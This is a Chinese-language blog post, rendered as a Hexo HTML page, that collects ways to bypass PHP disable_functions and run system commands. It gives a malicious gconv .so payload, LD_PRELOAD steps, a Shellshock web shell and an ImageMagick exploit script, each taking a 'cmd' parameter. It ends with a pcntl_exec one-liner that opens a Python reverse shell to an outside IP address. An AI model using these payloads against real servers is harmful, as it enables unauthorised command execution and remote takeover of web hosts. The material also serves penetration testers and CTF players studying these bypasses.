@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zls1793.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="1.黑名单爆破 介绍:利用编写的脚本爆破disable_functions未禁用的函数    在php_function里更新利用函数   在disable_function里放入通过phpinfo得到的禁用函数   2.利用iconv 利用条件:   Linux 操作系统   putenv设置环境变量可用   iconv触发或php伪协议过滤器触发   存在可写的目录, 需要上传 .so 文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php disable_functions绕过汇总">
+<meta property="og:url" content="https://zls1793.github.io/2024/03/08/disable_functions%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="LtmThink">
+<meta property="og:description" content="1.黑名单爆破 介绍:利用编写的脚本爆破disable_functions未禁用的函数    在php_function里更新利用函数   在disable_function里放入通过phpinfo得到的禁用函数   2.利用iconv 利用条件:   Linux 操作系统   putenv设置环境变量可用   iconv触发或php伪协议过滤器触发   存在可写的目录, 需要上传 .so 文件">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403080817395.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403080817397.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403080817398.png">
+<meta property="article:published_time" content="2024-03-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-08T00:24:51.173Z">
+<meta property="article:author" content="LtmThink">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403080817395.png">
+
+<link rel="canonical" href="https://zls1793.github.io/2024/03/08/disable_functions%E7%BB%95%E8%BF%87/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>php disable_functions绕过汇总 | LtmThink</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	<a target="_blank" rel="noopener" href="https://github.com/zls1793" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">LtmThink</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">LtmThink的个人博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zls1793.github.io/2024/03/08/disable_functions%E7%BB%95%E8%BF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="LtmThink">
+      <meta itemprop="description" content="LtmThink的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LtmThink">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          php disable_functions绕过汇总
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-08 00:00:00 / 修改时间：08:24:51" itemprop="dateCreated datePublished" datetime="2024-03-08T00:00:00+08:00">2024-03-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/php/" itemprop="url" rel="index"><span itemprop="name">php</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="1-黑名单爆破">1.黑名单爆破</h4>
+<p>介绍:利用编写的脚本爆破disable_functions未禁用的函数</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403080817395.png" alt=""></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>在php_function里更新利用函数</p>
+</li>
+<li class="lvl-2">
+<p>在disable_function里放入通过phpinfo得到的禁用函数</p>
+</li>
+</ul>
+<h4 id="2-利用iconv">2.利用iconv</h4>
+<p>利用条件:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>Linux 操作系统</p>
+</li>
+<li class="lvl-2">
+<p><code>putenv</code>设置环境变量可用</p>
+</li>
+<li class="lvl-2">
+<p><code>iconv</code>触发或php伪协议过滤器触发</p>
+</li>
+<li class="lvl-2">
+<p>存在可写的目录, 需要上传 <code>.so</code> 文件</p>
+</li>
+</ul>
+<p>原理介绍:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42303523/article/details/117911859">https://blog.csdn.net/qq_42303523/article/details/117911859</a></p>
+<p>利用方法:</p>
+<ol>
+<li class="lvl-3">
+<p>上传gconv-modules文件至可写入目录一般为/tmp(该文件用于指定解析字符集.so文件所在位置)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//gconv-modules内容</span><br><span class="line"></span><br><span class="line">module  PAYLOAD//    INTERNAL    ../../../../../../../../home/user/payload </span><br><span class="line">module  INTERNAL    PAYLOAD//    ../../../../../../../../home/user/payload </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>上传payload.so至可写入目录一般为/tmp(该文件用于shell执行我们想要操作)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//payload.so由payload.c解析而成</span><br><span class="line">//解析指令gcc payload.c -o payload.so -shared -fPIC</span><br><span class="line">//注意要在相类似的linux环境解析.so文件,避免兼容问题</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void gconv() &#123;&#125;</span><br><span class="line"></span><br><span class="line">void gconv_init() &#123;</span><br><span class="line">  puts(&quot;pwned&quot;);</span><br><span class="line">  system(&quot;/readflag &gt; /tmp/ki1ro&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>上传触发文件或直接触发(触发的语言选择多样)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//1.编译下面的poc.c代码为.so然后上传执行触发</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">  putenv(&quot;GCONV_PATH=.&quot;);</span><br><span class="line">  FILE *fp = fopen(&quot;some_random_file&quot;, &quot;w,ccs=payload&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//2.php代码直接触发iconv_open,eval执行下面这段代码</span><br><span class="line">putenv(&quot;GCONV_PATH=/tmp/&quot;);</span><br><span class="line">show_source(&quot;php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so&quot;);或者iconv(&quot;hacker&quot;, &quot;UTF-8&quot;, &quot;whatever&quot;);</span><br><span class="line"></span><br><span class="line">//3.上传php文件触发,include包含</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="3-利用-LD-PRELOAD-环境变量">3.利用 LD_PRELOAD 环境变量</h4>
+<p>思路为(其实和上面的iconv利用很像):</p>
+<ol>
+<li class="lvl-3">
+<p>创建一个.so文件,linux的动态链接库文件</p>
+</li>
+<li class="lvl-3">
+<p>使用putenv函数将<code>LD_PRELOAD</code>路径设置为我们自己创建的动态链接库文件</p>
+</li>
+<li class="lvl-3">
+<p>利用某个函数去触发该动态链接库</p>
+</li>
+</ol>
+<p>利用方法:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>上传利用.so文件到可上传目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//直接下载大佬的.so文件即可32为linux下x86，64位下载x64</span><br><span class="line">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-2">
+<p>上传利用.php文件到可上传目录或者直接粘贴php代码通过eval()执行(需要先进行url编码)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//直接下载即可</span><br><span class="line">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.php</span><br><span class="line">//该php文件需要get三个参数</span><br><span class="line">//cmd参数为需要执行的命令</span><br><span class="line">//outpath为命令执行后输出的结果文件位置(一般/tmp/result)</span><br><span class="line">//sopath为上传的.so文件位置(一般/tmp/bypass_disablefunc_x64.so)</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-2">
+<p>执行.php文件。如果有条件就上传php文件到/var/www/html目录,不行的话就文件包含.php文件</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403080817397.png" alt=""></p>
+</li>
+</ul>
+<h4 id="4-利用Windows组件COM绕过">4.利用Windows组件COM绕过</h4>
+<p>利用条件:</p>
+<ol>
+<li class="lvl-3">
+<p>windows下</p>
+</li>
+<li class="lvl-3">
+<p>开启com组件</p>
+</li>
+</ol>
+<p>利用方法:</p>
+<ol>
+<li class="lvl-3">
+<p>上传php脚本文件,文件包含或者直接访问文件,cmd参数提交命令</p>
+</li>
+</ol>
+<h4 id="5-利用-SplDoublyLinkedList-UAC">5.利用 SplDoublyLinkedList UAC</h4>
+<p>利用条件：</p>
+<ol>
+<li class="lvl-3">
+<p>PHP v7.4.10及其之前版本</p>
+</li>
+<li class="lvl-3">
+<p>PHP v8.0（Alpha）</p>
+</li>
+</ol>
+<p>原理详见:<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/251017.html">https://www.freebuf.com/articles/web/251017.html</a></p>
+<p>利用方法:</p>
+<ol>
+<li class="lvl-3">
+<p>上传php脚本文件,文件包含或者直接访问文件,cmd参数提交命令</p>
+</li>
+<li class="lvl-3">
+<p>直接粘贴php代码通过eval()执行(需要先进行url编码)</p>
+</li>
+<li class="lvl-3">
+<p>注意该利用脚本文件上传后只能执行一次命令,要再次执行需要重新上传</p>
+</li>
+</ol>
+<h4 id="6-利用-GC-UAF">6.利用 GC UAF</h4>
+<p>利用条件</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>Linux 操作系统</p>
+</li>
+<li class="lvl-2">
+<p>PHP7.0 - all versions to date</p>
+</li>
+<li class="lvl-2">
+<p>PHP7.1 - all versions to date</p>
+</li>
+<li class="lvl-2">
+<p>PHP7.2 - all versions to date</p>
+</li>
+<li class="lvl-2">
+<p>PHP7.3 - all versions to date</p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">EXP</a><br>
+<a target="_blank" rel="noopener" href="http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(1st)/">关于原理</a>原理:通过PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令。</p>
+<p>利用方法:</p>
+<ol>
+<li class="lvl-3">
+<p>上传利用脚本,文件包含或者直接访问文件,cmd参数提交命令</p>
+</li>
+<li class="lvl-3">
+<p>或者直接粘贴php代码通过eval()执行(需要先进行url编码)</p>
+</li>
+</ol>
+<h4 id="7-利用-Json-Serializer-UAF">7.利用 Json Serializer UAF</h4>
+<p>利用条件</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>Linux 操作系统</p>
+</li>
+<li class="lvl-2">
+<p>PHP7.1 - all versions to date</p>
+</li>
+<li class="lvl-2">
+<p>PHP7.2 &lt; 7.2.19 (released: 30 May 2019)</p>
+</li>
+<li class="lvl-2">
+<p>PHP7.3 &lt; 7.3.6 (released: 30 May 2019)</p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=77843">利用漏洞</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">POC</a></p>
+<p>利用方法:</p>
+<ol>
+<li class="lvl-3">
+<p>上传利用脚本,文件包含或者直接访问文件,cmd参数提交命令</p>
+</li>
+<li class="lvl-3">
+<p>或者直接粘贴php代码通过eval()执行(需要先进行url编码)</p>
+</li>
+</ol>
+<h4 id="8-利用Backtrace-UAF">8.利用Backtrace UAF</h4>
+<p>利用条件</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>Linux 操作系统</p>
+</li>
+<li class="lvl-2">
+<p>PHP7.0 - all versions to date</p>
+</li>
+<li class="lvl-2">
+<p>PHP7.1 - all versions to date</p>
+</li>
+<li class="lvl-2">
+<p>PHP7.2 - all versions to date</p>
+</li>
+<li class="lvl-2">
+<p>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</p>
+</li>
+<li class="lvl-2">
+<p>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=76047">利用漏洞</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">EXP</a></p>
+<p>利用方法:</p>
+<ol>
+<li class="lvl-3">
+<p>上传利用脚本,文件包含或者直接访问文件,cmd参数提交命令</p>
+</li>
+<li class="lvl-3">
+<p>或者直接粘贴php代码通过eval()执行(需要先进行url编码)</p>
+</li>
+</ol>
+<h4 id="9-利用Bash-Shellshock-CVE-2014-6271-破壳漏洞">9.利用Bash Shellshock(CVE-2014-6271)破壳漏洞</h4>
+<p>利用条件:php &lt; 5.6.2 &amp; bash &lt;= 4.3（破壳）</p>
+<p>原理介绍:Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p>
+<p>利用方法:</p>
+<ol>
+<li class="lvl-3">
+<p>简单测试:命令行输入<code>env x='() &#123; :;&#125;; echo vulnerable' bash -c &quot;echo this is a test&quot;</code>如果输出了<code>vulnerable</code>，则说明存在bash破壳漏洞</p>
+</li>
+<li class="lvl-3">
+<p>上传exp php文件,文件包含或者访问该文件,cmd传shell指令看是否有反应</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function shellshock($cmd) &#123; // Execute a command via CVE-2014-6271 @mail.c:283 </span><br><span class="line">   $tmp = tempnam(&quot;.&quot;,&quot;data&quot;); </span><br><span class="line">   putenv(&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;); </span><br><span class="line">   // In Safe Mode, the user may only alter environment variableswhose names </span><br><span class="line">   // begin with the prefixes supplied by this directive. </span><br><span class="line">   // By default, users will only be able to set environment variablesthat </span><br><span class="line">   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span><br><span class="line">   // PHP will let the user modify ANY environment variable! </span><br><span class="line">   //mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span><br><span class="line">   error_log(&#x27;a&#x27;,1);</span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   if($output != &quot;&quot;) return $output; </span><br><span class="line">   else return &quot;No output, or not vuln.&quot;; </span><br><span class="line">&#125; </span><br><span class="line">echo shellshock($_REQUEST[&quot;cmd&quot;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="10-利用ImageMagick-漏洞绕过-CVE-2016–3714">10.利用ImageMagick 漏洞绕过(CVE-2016–3714)</h4>
+<p>利用条件:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>目标主机安装了漏洞版本的imagemagick（&lt;= 3.3.0）</p>
+</li>
+<li class="lvl-2">
+<p>安装了php-imagick拓展并在php.ini中启用；</p>
+</li>
+<li class="lvl-2">
+<p>编写php通过new Imagick对象的方式来处理图片等格式文件；</p>
+</li>
+<li class="lvl-2">
+<p>PHP &gt;= 5.4</p>
+</li>
+</ul>
+<p>原理简介:存在该漏洞时处理恶意构造带有shell命令的图片时,会执行shell命令</p>
+<p>利用方法:</p>
+<ol>
+<li class="lvl-3">
+<p>上传exp php文件,文件包含或者访问该文件,cmd传shell指令看是否有反应</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Disable Functions: &quot; . ini_get(&#x27;disable_functions&#x27;) . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$command = PHP_SAPI == &#x27;cli&#x27; ? $argv[1] : $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if ($command == &#x27;&#x27;) &#123;</span><br><span class="line">    $command = &#x27;id&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exploit = &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(https://example.com/image.jpg&quot;|$command&quot;)&#x27;</span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">file_put_contents(&quot;KKKK.mvg&quot;, $exploit);</span><br><span class="line">$thumb = new Imagick();</span><br><span class="line">$thumb-&gt;readImage(&#x27;KKKK.mvg&#x27;);</span><br><span class="line">$thumb-&gt;writeImage(&#x27;KKKK.png&#x27;);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(&quot;KKKK.mvg&quot;);</span><br><span class="line">unlink(&quot;KKKK.png&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="11-利用pcntl-exec">11.利用pcntl_exec</h4>
+<p>使用条件:<strong>PHP安装并启用了pcntl插件</strong></p>
+<p>介绍:pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。<strong>pcntl_exec()是pcntl插件专有的命令执行函数来执行系统命令函数</strong>，可以在当前进程空间执行指定的程序。</p>
+<p>利用方法:</p>
+<ol>
+<li class="lvl-3">
+<p>上传pass.sh到可上传目录如/tmp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">内容如下</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line">ls -l /</span><br></pre></td></tr></table></figure>
+</li>
+<li class="lvl-3">
+<p>利用pcntl_exec()<a target="_blank" rel="noopener" href="http://xn--test-pk6hg45q.sh">执行test.sh</a>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用方式上传这一段代码并访问执行,或者文件包含该段代码</span></span><br><span class="line"><span class="comment">#或者直接eval执行pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/pass.sh&quot;));</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_exec&#x27;</span>)) &#123;</span><br><span class="line">   <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;/tmp/pass.sh&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;pcntl extension is not support!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>由于pcntl_exec()执行命令是没有回显的，所以其常与python结合来反弹shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php pcntl_exec(&quot;/usr/bin/python&quot;,array(&#x27;-c&#x27;,&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;132.232.75.90&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;));</span><br></pre></td></tr></table></figure>
